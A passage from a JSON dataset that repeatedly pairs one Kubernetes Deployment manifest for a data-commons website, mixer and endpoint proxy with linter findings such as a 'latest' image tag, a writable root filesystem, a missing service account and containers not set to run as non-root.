- --serve_recon_service=true\n        - --schema_path=/datacommons/mapping\n        - --import_group_tables=$(IMPORT_GROUP_TABLES)\n        - --memdb_path=/datacommons/memdb\n        volumeMounts:\n        - name: schema-mapping\n          mountPath: /datacommons/mapping\n        - name: memdb-config\n          mountPath: /datacommons/memdb\n        env:\n        - name: MIXER_PROJECT\n          valueFrom:\n            configMapKeyRef:\n              name: mixer-configmap\n              key: mixerProject\n        - name: STORE_PROJECT\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: store.project\n        - name: BIG_QUERY\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: bigquery.version\n        - name: IMPORT_GROUP_TABLES\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: bigtable_import_groups.version\n        - name: MIXER_HASH\n          valueFrom:\n            configMapKeyRef:\n              name: githash-configmap\n              key: mixer_hash.txt\n        ports:\n        - containerPort: 12345\n        readinessProbe:\n          exec:\n            command:\n            - /bin/grpc_health_probe\n            - -addr=:12345\n          periodSeconds: 10\n        livenessProbe:\n          exec:\n            command:\n            - /bin/grpc_health_probe\n            - -addr=:12345\n          periodSeconds: 10\n          initialDelaySeconds: 10\n      - name: esp\n        image: gcr.io/endpoints-release/endpoints-runtime:1\n        args:\n        - --service=$(SERVICE_NAME)\n        - --rollout_strategy=managed\n        - --http_port=8081\n        - --backend=grpc://127.0.0.1:12345\n        - --cors_preset=basic\n        - --healthz=healthz\n        env:\n        - name: SERVICE_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: mixer-configmap\n              key: serviceName\n        resources:\n          limits:\n            memory: 2G\n          requests:\n            memory: 2G\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          periodSeconds: 5\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          periodSeconds: 5\n          initialDelaySeconds: 5\n        ports:\n        - containerPort: 8081\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"mixer\" is using an invalid container image, \"gcr.io/datcom-ci/datacommons-mixer:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8556",
    "manifest_path": "data/manifests/the_stack_sample/sample_3200.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: website-app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: website-app\n  template:\n    metadata:\n      labels:\n        app: website-app\n    spec:\n      serviceAccountName: website-ksa\n      volumes:\n      - name: schema-mapping\n        configMap:\n          name: schema-mapping\n      - name: ai-config\n        configMap:\n          name: ai-config\n      - name: memdb-config\n        configMap:\n          name: memdb-config\n      containers:\n      - name: website\n        image: gcr.io/datcom-ci/datacommons-website:latest\n        imagePullPolicy: Always\n        args: []\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n          failureThreshold: 1\n          periodSeconds: 10\n        resources:\n          limits:\n            memory: 3G\n          requests:\n            memory: 3G\n        volumeMounts:\n        - name: ai-config\n          mountPath: /datacommons/ai\n        env:\n        - name: FLASK_ENV\n          valueFrom:\n            configMapKeyRef:\n              name: website-configmap\n              key: flaskEnv\n        - name: SECRET_PROJECT\n          valueFrom:\n            configMapKeyRef:\n              name: website-configmap\n              key: secretProject\n        - name: WEBSITE_HASH\n          valueFrom:\n            configMapKeyRef:\n              name: githash-configmap\n              key: website_hash.txt\n        - name: BIG_QUERY\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: bigquery.version\n        - name: BOUNCE\n          value: dummy\n      - name: mixer\n        image: gcr.io/datcom-ci/datacommons-mixer:latest\n        imagePullPolicy: Always\n        resources:\n          limits:\n            memory: 6G\n          requests:\n            memory: 6G\n        args:\n        - --mixer_project=$(MIXER_PROJECT)\n        - --store_project=$(STORE_PROJECT)\n        - --bq_dataset=$(BIG_QUERY)\n        - --serve_recon_service=true\n        - --schema_path=/datacommons/mapping\n        - --import_group_tables=$(IMPORT_GROUP_TABLES)\n        - --memdb_path=/datacommons/memdb\n        volumeMounts:\n        - name: schema-mapping\n          mountPath: /datacommons/mapping\n        - name: memdb-config\n          mountPath: /datacommons/memdb\n        env:\n        - name: MIXER_PROJECT\n          valueFrom:\n            configMapKeyRef:\n              name: mixer-configmap\n              key: mixerProject\n        - name: STORE_PROJECT\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: store.project\n        - name: BIG_QUERY\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: bigquery.version\n        - name: IMPORT_GROUP_TABLES\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: bigtable_import_groups.version\n        - name: MIXER_HASH\n          valueFrom:\n            configMapKeyRef:\n              name: githash-configmap\n              key: mixer_hash.txt\n        ports:\n        - containerPort: 12345\n        readinessProbe:\n          exec:\n            command:\n            - /bin/grpc_health_probe\n            - -addr=:12345\n          periodSeconds: 10\n        livenessProbe:\n          exec:\n            command:\n            - /bin/grpc_health_probe\n            - -addr=:12345\n          periodSeconds: 10\n          initialDelaySeconds: 10\n      - name: esp\n        image: gcr.io/endpoints-release/endpoints-runtime:1\n        args:\n        - --service=$(SERVICE_NAME)\n        - --rollout_strategy=managed\n        - --http_port=8081\n        - --backend=grpc://127.0.0.1:12345\n        - --cors_preset=basic\n        - --healthz=healthz\n        env:\n        - name: SERVICE_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: mixer-configmap\n              key: serviceName\n        resources:\n          limits:\n            memory: 2G\n          requests:\n            memory: 2G\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          periodSeconds: 5\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          periodSeconds: 5\n          initialDelaySeconds: 5\n        ports:\n        - containerPort: 8081\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"website\" is using an invalid container image, \"gcr.io/datcom-ci/datacommons-website:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8557",
    "manifest_path": "data/manifests/the_stack_sample/sample_3200.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: website-app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: website-app\n  template:\n    metadata:\n      labels:\n        app: website-app\n    spec:\n      serviceAccountName: website-ksa\n      volumes:\n      - name: schema-mapping\n        configMap:\n          name: schema-mapping\n      - name: ai-config\n        configMap:\n          name: ai-config\n      - name: memdb-config\n        configMap:\n          name: memdb-config\n      containers:\n      - name: website\n        image: gcr.io/datcom-ci/datacommons-website:latest\n        imagePullPolicy: Always\n        args: []\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n          failureThreshold: 1\n          periodSeconds: 10\n        resources:\n          limits:\n            memory: 3G\n          requests:\n            memory: 3G\n        volumeMounts:\n        - name: ai-config\n          mountPath: /datacommons/ai\n        env:\n        - name: FLASK_ENV\n          valueFrom:\n            configMapKeyRef:\n              name: website-configmap\n              key: flaskEnv\n        - name: SECRET_PROJECT\n          valueFrom:\n            configMapKeyRef:\n              name: website-configmap\n              key: secretProject\n        - name: WEBSITE_HASH\n          valueFrom:\n            configMapKeyRef:\n              name: githash-configmap\n              key: website_hash.txt\n        - name: BIG_QUERY\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: bigquery.version\n        - name: BOUNCE\n          value: dummy\n      - name: mixer\n        image: gcr.io/datcom-ci/datacommons-mixer:latest\n        imagePullPolicy: Always\n        resources:\n          limits:\n            memory: 6G\n          requests:\n            memory: 6G\n        args:\n        - --mixer_project=$(MIXER_PROJECT)\n        - --store_project=$(STORE_PROJECT)\n        - --bq_dataset=$(BIG_QUERY)\n        - --serve_recon_service=true\n        - --schema_path=/datacommons/mapping\n        - --import_group_tables=$(IMPORT_GROUP_TABLES)\n        - --memdb_path=/datacommons/memdb\n        volumeMounts:\n        - name: schema-mapping\n          mountPath: /datacommons/mapping\n        - name: memdb-config\n          mountPath: /datacommons/memdb\n        env:\n        - name: MIXER_PROJECT\n          valueFrom:\n            configMapKeyRef:\n              name: mixer-configmap\n              key: mixerProject\n        - name: STORE_PROJECT\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: store.project\n        - name: BIG_QUERY\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: bigquery.version\n        - name: IMPORT_GROUP_TABLES\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: bigtable_import_groups.version\n        - name: MIXER_HASH\n          valueFrom:\n            configMapKeyRef:\n              name: githash-configmap\n              key: mixer_hash.txt\n        ports:\n        - containerPort: 12345\n        readinessProbe:\n          exec:\n            command:\n            - /bin/grpc_health_probe\n            - -addr=:12345\n          periodSeconds: 10\n        livenessProbe:\n          exec:\n            command:\n            - /bin/grpc_health_probe\n            - -addr=:12345\n          periodSeconds: 10\n          initialDelaySeconds: 10\n      - name: esp\n        image: gcr.io/endpoints-release/endpoints-runtime:1\n        args:\n        - --service=$(SERVICE_NAME)\n        - --rollout_strategy=managed\n        - --http_port=8081\n        - --backend=grpc://127.0.0.1:12345\n        - --cors_preset=basic\n        - --healthz=healthz\n        env:\n        - name: SERVICE_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: mixer-configmap\n              key: serviceName\n        resources:\n          limits:\n            memory: 2G\n          requests:\n            memory: 2G\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          periodSeconds: 5\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          periodSeconds: 5\n          initialDelaySeconds: 5\n        ports:\n        - containerPort: 8081\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"esp\" does not have a read-only root file system"
  },
  {
    "id": "8558",
    "manifest_path": "data/manifests/the_stack_sample/sample_3200.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: website-app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: website-app\n  template:\n    metadata:\n      labels:\n        app: website-app\n    spec:\n      serviceAccountName: website-ksa\n      volumes:\n      - name: schema-mapping\n        configMap:\n          name: schema-mapping\n      - name: ai-config\n        configMap:\n          name: ai-config\n      - name: memdb-config\n        configMap:\n          name: memdb-config\n      containers:\n      - name: website\n        image: gcr.io/datcom-ci/datacommons-website:latest\n        imagePullPolicy: Always\n        args: []\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n          failureThreshold: 1\n          periodSeconds: 10\n        resources:\n          limits:\n            memory: 3G\n          requests:\n            memory: 3G\n        volumeMounts:\n        - name: ai-config\n          mountPath: /datacommons/ai\n        env:\n        - name: FLASK_ENV\n          valueFrom:\n            configMapKeyRef:\n              name: website-configmap\n              key: flaskEnv\n        - name: SECRET_PROJECT\n          valueFrom:\n            configMapKeyRef:\n              name: website-configmap\n              key: secretProject\n        - name: WEBSITE_HASH\n          valueFrom:\n            configMapKeyRef:\n              name: githash-configmap\n              key: website_hash.txt\n        - name: BIG_QUERY\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: bigquery.version\n        - name: BOUNCE\n          value: dummy\n      - name: mixer\n        image: gcr.io/datcom-ci/datacommons-mixer:latest\n        imagePullPolicy: Always\n        resources:\n          limits:\n            memory: 6G\n          requests:\n            memory: 6G\n        args:\n        - --mixer_project=$(MIXER_PROJECT)\n        - --store_project=$(STORE_PROJECT)\n        - --bq_dataset=$(BIG_QUERY)\n        - --serve_recon_service=true\n        - --schema_path=/datacommons/mapping\n        - --import_group_tables=$(IMPORT_GROUP_TABLES)\n        - --memdb_path=/datacommons/memdb\n        volumeMounts:\n        - name: schema-mapping\n          mountPath: /datacommons/mapping\n        - name: memdb-config\n          mountPath: /datacommons/memdb\n        env:\n        - name: MIXER_PROJECT\n          valueFrom:\n            configMapKeyRef:\n              name: mixer-configmap\n              key: mixerProject\n        - name: STORE_PROJECT\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: store.project\n        - name: BIG_QUERY\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: bigquery.version\n        - name: IMPORT_GROUP_TABLES\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: bigtable_import_groups.version\n        - name: MIXER_HASH\n          valueFrom:\n            configMapKeyRef:\n              name: githash-configmap\n              key: mixer_hash.txt\n        ports:\n        - containerPort: 12345\n        readinessProbe:\n          exec:\n            command:\n            - /bin/grpc_health_probe\n            - -addr=:12345\n          periodSeconds: 10\n        livenessProbe:\n          exec:\n            command:\n            - /bin/grpc_health_probe\n            - -addr=:12345\n          periodSeconds: 10\n          initialDelaySeconds: 10\n      - name: esp\n        image: gcr.io/endpoints-release/endpoints-runtime:1\n        args:\n        - --service=$(SERVICE_NAME)\n        - --rollout_strategy=managed\n        - --http_port=8081\n        - --backend=grpc://127.0.0.1:12345\n        - --cors_preset=basic\n        - --healthz=healthz\n        env:\n        - name: SERVICE_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: mixer-configmap\n              key: serviceName\n        resources:\n          limits:\n            memory: 2G\n          requests:\n            memory: 2G\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          periodSeconds: 5\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          periodSeconds: 5\n          initialDelaySeconds: 5\n        ports:\n        - containerPort: 8081\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"mixer\" does not have a read-only root file system"
  },
  {
    "id": "8559",
    "manifest_path": "data/manifests/the_stack_sample/sample_3200.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: website-app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: website-app\n  template:\n    metadata:\n      labels:\n        app: website-app\n    spec:\n      serviceAccountName: website-ksa\n      volumes:\n      - name: schema-mapping\n        configMap:\n          name: schema-mapping\n      - name: ai-config\n        configMap:\n          name: ai-config\n      - name: memdb-config\n        configMap:\n          name: memdb-config\n      containers:\n      - name: website\n        image: gcr.io/datcom-ci/datacommons-website:latest\n        imagePullPolicy: Always\n        args: []\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n          failureThreshold: 1\n          periodSeconds: 10\n        resources:\n          limits:\n            memory: 3G\n          requests:\n            memory: 3G\n        volumeMounts:\n        - name: ai-config\n          mountPath: /datacommons/ai\n        env:\n        - name: FLASK_ENV\n          valueFrom:\n            configMapKeyRef:\n              name: website-configmap\n              key: flaskEnv\n        - name: SECRET_PROJECT\n          valueFrom:\n            configMapKeyRef:\n              name: website-configmap\n              key: secretProject\n        - name: WEBSITE_HASH\n          valueFrom:\n            configMapKeyRef:\n              name: githash-configmap\n              key: website_hash.txt\n        - name: BIG_QUERY\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: bigquery.version\n        - name: BOUNCE\n          value: dummy\n      - name: mixer\n        image: gcr.io/datcom-ci/datacommons-mixer:latest\n        imagePullPolicy: Always\n        resources:\n          limits:\n            memory: 6G\n          requests:\n            memory: 6G\n        args:\n        - --mixer_project=$(MIXER_PROJECT)\n        - --store_project=$(STORE_PROJECT)\n        - --bq_dataset=$(BIG_QUERY)\n        - --serve_recon_service=true\n        - --schema_path=/datacommons/mapping\n        - --import_group_tables=$(IMPORT_GROUP_TABLES)\n        - --memdb_path=/datacommons/memdb\n        volumeMounts:\n        - name: schema-mapping\n          mountPath: /datacommons/mapping\n        - name: memdb-config\n          mountPath: /datacommons/memdb\n        env:\n        - name: MIXER_PROJECT\n          valueFrom:\n            configMapKeyRef:\n              name: mixer-configmap\n              key: mixerProject\n        - name: STORE_PROJECT\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: store.project\n        - name: BIG_QUERY\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: bigquery.version\n        - name: IMPORT_GROUP_TABLES\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: bigtable_import_groups.version\n        - name: MIXER_HASH\n          valueFrom:\n            configMapKeyRef:\n              name: githash-configmap\n              key: mixer_hash.txt\n        ports:\n        - containerPort: 12345\n        readinessProbe:\n          exec:\n            command:\n            - /bin/grpc_health_probe\n            - -addr=:12345\n          periodSeconds: 10\n        livenessProbe:\n          exec:\n            command:\n            - /bin/grpc_health_probe\n            - -addr=:12345\n          periodSeconds: 10\n          initialDelaySeconds: 10\n      - name: esp\n        image: gcr.io/endpoints-release/endpoints-runtime:1\n        args:\n        - --service=$(SERVICE_NAME)\n        - --rollout_strategy=managed\n        - --http_port=8081\n        - --backend=grpc://127.0.0.1:12345\n        - --cors_preset=basic\n        - --healthz=healthz\n        env:\n        - name: SERVICE_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: mixer-configmap\n              key: serviceName\n        resources:\n          limits:\n            memory: 2G\n          requests:\n            memory: 2G\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          periodSeconds: 5\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          periodSeconds: 5\n          initialDelaySeconds: 5\n        ports:\n        - containerPort: 8081\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"website\" does not have a read-only root file system"
  },
  {
    "id": "8560",
    "manifest_path": "data/manifests/the_stack_sample/sample_3200.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: website-app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: website-app\n  template:\n    metadata:\n      labels:\n        app: website-app\n    spec:\n      serviceAccountName: website-ksa\n      volumes:\n      - name: schema-mapping\n        configMap:\n          name: schema-mapping\n      - name: ai-config\n        configMap:\n          name: ai-config\n      - name: memdb-config\n        configMap:\n          name: memdb-config\n      containers:\n      - name: website\n        image: gcr.io/datcom-ci/datacommons-website:latest\n        imagePullPolicy: Always\n        args: []\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n          failureThreshold: 1\n          periodSeconds: 10\n        resources:\n          limits:\n            memory: 3G\n          requests:\n            memory: 3G\n        volumeMounts:\n        - name: ai-config\n          mountPath: /datacommons/ai\n        env:\n        - name: FLASK_ENV\n          valueFrom:\n            configMapKeyRef:\n              name: website-configmap\n              key: flaskEnv\n        - name: SECRET_PROJECT\n          valueFrom:\n            configMapKeyRef:\n              name: website-configmap\n              key: secretProject\n        - name: WEBSITE_HASH\n          valueFrom:\n            configMapKeyRef:\n              name: githash-configmap\n              key: website_hash.txt\n        - name: BIG_QUERY\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: bigquery.version\n        - name: BOUNCE\n          value: dummy\n      - name: mixer\n        image: gcr.io/datcom-ci/datacommons-mixer:latest\n        imagePullPolicy: Always\n        resources:\n          limits:\n            memory: 6G\n          requests:\n            memory: 6G\n        args:\n        - --mixer_project=$(MIXER_PROJECT)\n        - --store_project=$(STORE_PROJECT)\n        - --bq_dataset=$(BIG_QUERY)\n        - --serve_recon_service=true\n        - --schema_path=/datacommons/mapping\n        - --import_group_tables=$(IMPORT_GROUP_TABLES)\n        - --memdb_path=/datacommons/memdb\n        volumeMounts:\n        - name: schema-mapping\n          mountPath: /datacommons/mapping\n        - name: memdb-config\n          mountPath: /datacommons/memdb\n        env:\n        - name: MIXER_PROJECT\n          valueFrom:\n            configMapKeyRef:\n              name: mixer-configmap\n              key: mixerProject\n        - name: STORE_PROJECT\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: store.project\n        - name: BIG_QUERY\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: bigquery.version\n        - name: IMPORT_GROUP_TABLES\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: bigtable_import_groups.version\n        - name: MIXER_HASH\n          valueFrom:\n            configMapKeyRef:\n              name: githash-configmap\n              key: mixer_hash.txt\n        ports:\n        - containerPort: 12345\n        readinessProbe:\n          exec:\n            command:\n            - /bin/grpc_health_probe\n            - -addr=:12345\n          periodSeconds: 10\n        livenessProbe:\n          exec:\n            command:\n            - /bin/grpc_health_probe\n            - -addr=:12345\n          periodSeconds: 10\n          initialDelaySeconds: 10\n      - name: esp\n        image: gcr.io/endpoints-release/endpoints-runtime:1\n        args:\n        - --service=$(SERVICE_NAME)\n        - --rollout_strategy=managed\n        - --http_port=8081\n        - --backend=grpc://127.0.0.1:12345\n        - --cors_preset=basic\n        - --healthz=healthz\n        env:\n        - name: SERVICE_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: mixer-configmap\n              key: serviceName\n        resources:\n          limits:\n            memory: 2G\n          requests:\n            memory: 2G\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          periodSeconds: 5\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          periodSeconds: 5\n          initialDelaySeconds: 5\n        ports:\n        - containerPort: 8081\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"website-ksa\" not found"
  },
  {
    "id": "8561",
    "manifest_path": "data/manifests/the_stack_sample/sample_3200.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: website-app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: website-app\n  template:\n    metadata:\n      labels:\n        app: website-app\n    spec:\n      serviceAccountName: website-ksa\n      volumes:\n      - name: schema-mapping\n        configMap:\n          name: schema-mapping\n      - name: ai-config\n        configMap:\n          name: ai-config\n      - name: memdb-config\n        configMap:\n          name: memdb-config\n      containers:\n      - name: website\n        image: gcr.io/datcom-ci/datacommons-website:latest\n        imagePullPolicy: Always\n        args: []\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n          failureThreshold: 1\n          periodSeconds: 10\n        resources:\n          limits:\n            memory: 3G\n          requests:\n            memory: 3G\n        volumeMounts:\n        - name: ai-config\n          mountPath: /datacommons/ai\n        env:\n        - name: FLASK_ENV\n          valueFrom:\n            configMapKeyRef:\n              name: website-configmap\n              key: flaskEnv\n        - name: SECRET_PROJECT\n          valueFrom:\n            configMapKeyRef:\n              name: website-configmap\n              key: secretProject\n        - name: WEBSITE_HASH\n          valueFrom:\n            configMapKeyRef:\n              name: githash-configmap\n              key: website_hash.txt\n        - name: BIG_QUERY\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: bigquery.version\n        - name: BOUNCE\n          value: dummy\n      - name: mixer\n        image: gcr.io/datcom-ci/datacommons-mixer:latest\n        imagePullPolicy: Always\n        resources:\n          limits:\n            memory: 6G\n          requests:\n            memory: 6G\n        args:\n        - --mixer_project=$(MIXER_PROJECT)\n        - --store_project=$(STORE_PROJECT)\n        - --bq_dataset=$(BIG_QUERY)\n        - --serve_recon_service=true\n        - --schema_path=/datacommons/mapping\n        - --import_group_tables=$(IMPORT_GROUP_TABLES)\n        - --memdb_path=/datacommons/memdb\n        volumeMounts:\n        - name: schema-mapping\n          mountPath: /datacommons/mapping\n        - name: memdb-config\n          mountPath: /datacommons/memdb\n        env:\n        - name: MIXER_PROJECT\n          valueFrom:\n            configMapKeyRef:\n              name: mixer-configmap\n              key: mixerProject\n        - name: STORE_PROJECT\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: store.project\n        - name: BIG_QUERY\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: bigquery.version\n        - name: IMPORT_GROUP_TABLES\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: bigtable_import_groups.version\n        - name: MIXER_HASH\n          valueFrom:\n            configMapKeyRef:\n              name: githash-configmap\n              key: mixer_hash.txt\n        ports:\n        - containerPort: 12345\n        readinessProbe:\n          exec:\n            command:\n            - /bin/grpc_health_probe\n            - -addr=:12345\n          periodSeconds: 10\n        livenessProbe:\n          exec:\n            command:\n            - /bin/grpc_health_probe\n            - -addr=:12345\n          periodSeconds: 10\n          initialDelaySeconds: 10\n      - name: esp\n        image: gcr.io/endpoints-release/endpoints-runtime:1\n        args:\n        - --service=$(SERVICE_NAME)\n        - --rollout_strategy=managed\n        - --http_port=8081\n        - --backend=grpc://127.0.0.1:12345\n        - --cors_preset=basic\n        - --healthz=healthz\n        env:\n        - name: SERVICE_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: mixer-configmap\n              key: serviceName\n        resources:\n          limits:\n            memory: 2G\n          requests:\n            memory: 2G\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          periodSeconds: 5\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          periodSeconds: 5\n          initialDelaySeconds: 5\n        ports:\n        - containerPort: 8081\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"esp\" is not set to runAsNonRoot"
  },
  {
    "id": "8562",
    "manifest_path": "data/manifests/the_stack_sample/sample_3200.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: website-app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: website-app\n  template:\n    metadata:\n      labels:\n        app: website-app\n    spec:\n      serviceAccountName: website-ksa\n      volumes:\n      - name: schema-mapping\n        configMap:\n          name: schema-mapping\n      - name: ai-config\n        configMap:\n          name: ai-config\n      - name: memdb-config\n        configMap:\n          name: memdb-config\n      containers:\n      - name: website\n        image: gcr.io/datcom-ci/datacommons-website:latest\n        imagePullPolicy: Always\n        args: []\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n          failureThreshold: 1\n          periodSeconds: 10\n        resources:\n          limits:\n            memory: 3G\n          requests:\n            memory: 3G\n        volumeMounts:\n        - name: ai-config\n          mountPath: /datacommons/ai\n        env:\n        - name: FLASK_ENV\n          valueFrom:\n            configMapKeyRef:\n              name: website-configmap\n              key: flaskEnv\n        - name: SECRET_PROJECT\n          valueFrom:\n            configMapKeyRef:\n              name: website-configmap\n              key: secretProject\n        - name: WEBSITE_HASH\n          valueFrom:\n            configMapKeyRef:\n              name: githash-configmap\n              key: website_hash.txt\n        - name: BIG_QUERY\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: bigquery.version\n        - name: BOUNCE\n          value: dummy\n      - name: mixer\n        image: gcr.io/datcom-ci/datacommons-mixer:latest\n        imagePullPolicy: Always\n        resources:\n          limits:\n            memory: 6G\n          requests:\n            memory: 6G\n        args:\n        - --mixer_project=$(MIXER_PROJECT)\n        - --store_project=$(STORE_PROJECT)\n        - --bq_dataset=$(BIG_QUERY)\n        - --serve_recon_service=true\n        - --schema_path=/datacommons/mapping\n        - --import_group_tables=$(IMPORT_GROUP_TABLES)\n        - --memdb_path=/datacommons/memdb\n        volumeMounts:\n        - name: schema-mapping\n          mountPath: /datacommons/mapping\n        - name: memdb-config\n          mountPath: /datacommons/memdb\n        env:\n        - name: MIXER_PROJECT\n          valueFrom:\n            configMapKeyRef:\n              name: mixer-configmap\n              key: mixerProject\n        - name: STORE_PROJECT\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: store.project\n        - name: BIG_QUERY\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: bigquery.version\n        - name: IMPORT_GROUP_TABLES\n          valueFrom:\n            configMapKeyRef:\n              name: store-configmap\n              key: bigtable_import_groups.version\n        - name: MIXER_HASH\n          valueFrom:\n            configMapKeyRef:\n              name: githash-configmap\n              key: mixer_hash.txt\n        ports:\n        - containerPort: 12345\n        readinessProbe:\n          exec:\n            command:\n            - /bin/grpc_health_probe\n            - -addr=:12345\n          periodSeconds: 10\n        livenessProbe:\n          exec:\n            command:\n            - /bin/grpc_health_probe\n            - -addr=:12345\n          periodSeconds: 10\n          initialDelaySeconds: 10\n      - name: esp\n        image: gcr.io/endpoints-release/endpoints-runtime:1\n        args:\n        - --service=$(SERVICE_NAME)\n        - --rollout_strategy=managed\n        - --http_port=8081\n        - --backend=grpc://127.0.0.1:12345\n        - --cors_preset=basic\n        - --healthz=healthz\n        env:\n        - name: SERVICE_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: mixer-configmap\n              key: serviceName\n        resources:\n          limits:\n            memory: 2G\n          requests:\n            memory: 2G\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          periodSeconds: 5\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          periodSeconds: 5\n          initialDelaySeconds: 5\n        ports:\n        - containerPort: 8081\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"mixer\" is not set to runAsNonRoot"
  },
  {
    "id": "8563",
    "manifest_path": "data/manifests/the_stack_sample/sample_3200.yaml",
